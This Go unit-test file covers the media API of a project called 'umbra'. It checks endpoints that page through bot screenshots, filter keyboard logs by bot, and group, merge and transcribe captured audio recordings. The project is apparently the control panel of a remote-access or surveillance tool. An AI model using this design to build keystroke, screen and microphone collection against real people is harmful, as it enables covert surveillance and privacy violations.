package api

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/s045pd/umbra/internal/db/models"
	"github.com/s045pd/umbra/internal/transcribe"
)

func setupMediaAPI(t *testing.T) (*MediaAPI, *gorm.DB) {
	t.Helper()
	g, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := g.AutoMigrate(models.All()...); err != nil {
		t.Fatal(err)
	}
	return &MediaAPI{DB: g}, g
}

func TestScreenshots_Pagination(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	for i := 0; i < 10; i++ {
		gdb.Create(&models.BotScreenshot{
			BotID: botID, ImageData: "img", Timestamp: time.Now().Add(time.Duration(i) * time.Second),
		})
	}
	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String()+"&limit=3&offset=0", nil)
	rr := httptest.NewRecorder()
	a.Screenshots(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	if got := len(resp.Result.([]any)); got != 3 {
		t.Errorf("len=%d, want 3", got)
	}
}

func TestKeyboardLogs_BotIDFilter(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botA := uuid.New()
	botB := uuid.New()
	now := time.Now()
	gdb.Create(&models.BotKeyboardLog{BotID: botA, Keys: "a1", Timestamp: now})
	gdb.Create(&models.BotKeyboardLog{BotID: botA, Keys: "a2", Timestamp: now})
	gdb.Create(&models.BotKeyboardLog{BotID: botB, Keys: "b1", Timestamp: now})

	r := httptest.NewRequest(http.MethodGet, "/?id="+botA.String(), nil)
	rr := httptest.NewRecorder()
	a.KeyboardLogs(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	if got := len(resp.Result.([]any)); got != 2 {
		t.Errorf("expected 2 rows for botA, got %d", got)
	}
}

func TestRecordings(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	now := time.Now()
	gdb.Create(&models.BotRecording{Bot: botID, Recording: "abc", Timestamp: &now})
	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String(), nil)
	rr := httptest.NewRecorder()
	a.Recordings(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestAudioSessions_OrphanRecordingsGroupedByGap(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	day1 := time.Date(2024, 12, 25, 7, 14, 15, 0, time.UTC)
	day2 := time.Date(2025, 1, 15, 7, 22, 0, 0, time.UTC)
	var first uuid.UUID
	for i := 0; i < 3; i++ {
		row := models.BotRecording{
			Bot: botID, Recording: base64.StdEncoding.EncodeToString([]byte("mp3")),
		}
		row.CreatedAt = day1.Add(time.Duration(i) * 10 * time.Second)
		if err := gdb.Create(&row).Error; err != nil {
			t.Fatal(err)
		}
		if i == 0 {
			first = row.ID
		}
	}
	later := models.BotRecording{Bot: botID, Recording: "x"}
	later.CreatedAt = day2
	if err := gdb.Create(&later).Error; err != nil {
		t.Fatal(err)
	}

	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String(), nil)
	rr := httptest.NewRecorder()
	a.AudioSessions(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	rows := resp.Result.([]any)
	if len(rows) != 2 {
		t.Fatalf("expected 2 orphan takes, got %d (%v)", len(rows), rows)
	}
	sess := rows[0].(map[string]any)
	sid, _ := sess["session_id"].(string)
	if !strings.HasPrefix(sid, "orphan-") {
		t.Fatalf("session_id=%q, want orphan- prefix", sid)
	}
	if sess["chunk_count"].(float64) != 3 && sess["chunk_count"].(float64) != 1 {
		t.Errorf("unexpected chunk_count %v", sess["chunk_count"])
	}

	cr := httptest.NewRequest(http.MethodGet, "/", nil)
	cr = cr.WithContext(chiRouteCtx("session_id", "orphan-"+first.String()))
	crr := httptest.NewRecorder()
	a.AudioSessionChunks(crr, cr)
	if crr.Code != http.StatusOK {
		t.Fatalf("chunks status=%d body=%s", crr.Code, crr.Body.String())
	}
	var cresp envelope
	_ = json.Unmarshal(crr.Body.Bytes(), &cresp)
	chunks, _ := cresp.Result.([]any)
	if len(chunks) != 3 {
		t.Fatalf("orphan chunks=%d, want 3 for the Dec 25 take", len(chunks))
	}
}

func TestAudioChunk_SniffsMPEG(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	mp3 := []byte{0xff, 0xfb, 0x90, 0xc4, 0x00, 0x00}
	row := models.BotRecording{Bot: uuid.New(), Recording: base64.StdEncoding.EncodeToString(mp3)}
	if err := gdb.Create(&row).Error; err != nil {
		t.Fatal(err)
	}
	r := httptest.NewRequest(http.MethodGet, "/", nil)
	r = r.WithContext(chiRouteCtx("id", row.ID.String()))
	rr := httptest.NewRecorder()
	a.AudioChunk(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if ct := rr.Header().Get("Content-Type"); ct != "audio/mpeg" {
		t.Errorf("content-type=%s, want audio/mpeg", ct)
	}
	if got := rr.Body.Bytes(); string(got) != string(mp3) {
		t.Errorf("body=%x", got)
	}
}

func TestAudioSessions_Aggregation(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	now := time.Now()
	for i := 0; i < 3; i++ {
		ts := now.Add(time.Duration(i) * time.Second)
		gdb.Create(&models.BotRecording{Bot: botID, Recording: "x", SessionID: "s1", Timestamp: &ts})
	}
	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String(), nil)
	rr := httptest.NewRecorder()
	a.AudioSessions(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	rows := resp.Result.([]any)
	if len(rows) != 1 {
		t.Fatalf("expected 1 session, got %d", len(rows))
	}
	sess := rows[0].(map[string]any)
	if sess["chunk_count"].(float64) != 3 {
		t.Errorf("chunk_count = %v", sess["chunk_count"])
	}
}

func TestAudioSessionMerge(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	now := time.Now()
	later := now.Add(time.Second)
	gdb.Create(&models.BotRecording{Bot: uuid.New(), Recording: base64.StdEncoding.EncodeToString([]byte("ab")), SessionID: "s1", Timestamp: &now})
	gdb.Create(&models.BotRecording{Bot: uuid.New(), Recording: base64.StdEncoding.EncodeToString([]byte("cd")), SessionID: "s1", Timestamp: &later})

	r := httptest.NewRequest(http.MethodGet, "/api/v1/audio-session/s1", nil)
	r = r.WithContext(chiRouteCtx("session_id", "s1"))
	rr := httptest.NewRecorder()
	a.AudioSessionMerge(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if ct := rr.Header().Get("Content-Type"); ct == "" {
		t.Errorf("missing content-type")
	}
	if got := rr.Body.String(); got != "abcd" {
		t.Fatalf("merged=%q, want concatenated timeslice bytes abcd", got)
	}
}

func TestAudioSessions_IncludesTranscript(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	now := time.Now()
	gdb.Create(&models.BotRecording{Bot: botID, Recording: "x", SessionID: "s1", Text: "hello", Timestamp: &now})
	later := now.Add(time.Second)
	gdb.Create(&models.BotRecording{Bot: botID, Recording: "y", SessionID: "s1", Text: "world", Timestamp: &later})

	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String(), nil)
	rr := httptest.NewRecorder()
	a.AudioSessions(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	rows := resp.Result.([]any)
	if len(rows) != 1 {
		t.Fatalf("sessions=%d", len(rows))
	}
	if got := rows[0].(map[string]any)["transcript"]; got != "hello world" {
		t.Errorf("transcript=%v, want hello world", got)
	}
}

func TestAudioSessionTranscribe_SavesOrphanAndAcceptsWav(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	row := models.BotRecording{Bot: botID, Recording: base64.StdEncoding.EncodeToString([]byte("ab"))}
	if err := gdb.Create(&row).Error; err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	bin := dir + "/whisper-cli"
	model := dir + "/ggml-tiny.bin"
	_ = os.WriteFile(model, []byte("m"), 0o644)
	_ = os.WriteFile(bin, []byte("#!/bin/sh\necho '  transcript ok  '\n"), 0o755)
	a.Transcribe = transcribe.Options{Bin: bin, Model: model}

	sid := "orphan-" + row.ID.String()
	body := &bytes.Buffer{}
	w := multipart.NewWriter(body)
	part, err := w.CreateFormFile("audio", "take.wav")
	if err != nil {
		t.Fatal(err)
	}
	_, _ = part.Write([]byte("RIFF....WAVE...."))
	_ = w.Close()
	r := httptest.NewRequest(http.MethodPost, "/", body)
	r.Header.Set("Content-Type", w.FormDataContentType())
	r = r.WithContext(chiRouteCtx("session_id", sid))
	rr := httptest.NewRecorder()
	a.AudioSessionTranscribe(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var saved models.BotRecording
	if err := gdb.First(&saved, "id = ?", row.ID).Error; err != nil {
		t.Fatal(err)
	}
	if saved.Text != "transcript ok" {
		t.Fatalf("saved text=%q", saved.Text)
	}
}

func TestAudioSessionTranscribe_Disabled(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	now := time.Now()
	gdb.Create(&models.BotRecording{
		Bot: uuid.New(), Recording: base64.StdEncoding.EncodeToString([]byte("ab")),
		SessionID: "s1", Timestamp: &now,
	})
	r := httptest.NewRequest(http.MethodPost, "/", nil)
	r = r.WithContext(chiRouteCtx("session_id", "s1"))
	rr := httptest.NewRecorder()
	a.AudioSessionTranscribe(rr, r)
	if rr.Code != http.StatusServiceUnavailable {
		t.Fatalf("status=%d body=%s, want 503", rr.Code, rr.Body.String())
	}
}
